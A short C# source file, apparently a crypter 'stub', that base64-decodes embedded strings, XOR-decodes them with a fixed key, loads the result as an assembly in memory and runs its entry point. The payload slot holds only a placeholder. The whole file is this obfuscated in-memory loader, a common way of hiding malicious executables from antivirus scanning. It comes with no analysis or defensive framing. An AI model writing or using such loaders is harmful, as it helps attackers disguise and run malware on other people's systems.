using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace Stub
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {

            string[] key = new string[1] { "SimpleText" };
            List<byte> listByte = new List<byte>();

            for (int i = 0; i < key.Length; i++)
            {
                var range = Convert.FromBase64String(key[i]);

                for (int j = 0; j < range.Length; j++)
                {
                    range[j] = (byte)((uint)range[j] ^ 2);
                }

                listByte.AddRange(range);
            }

            var asm = Assembly.Load(listByte.ToArray());
            asm.EntryPoint.Invoke(null, new object[] { args }); //invoke(asm, args);
        }
    }
}
